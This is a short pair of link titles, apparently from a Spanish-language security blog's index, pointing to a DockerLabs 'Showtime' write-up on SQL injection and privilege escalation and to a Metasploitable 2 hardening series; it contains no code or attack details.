- [DockerLabs: Showtime - Explotación SQLi y Privesc](/secnotes/2026/09/11/DockerLabs-Showtime.html)
- [Serie Completa de Hardening en Metasploitable 2](/secnotes/metasploitable2)
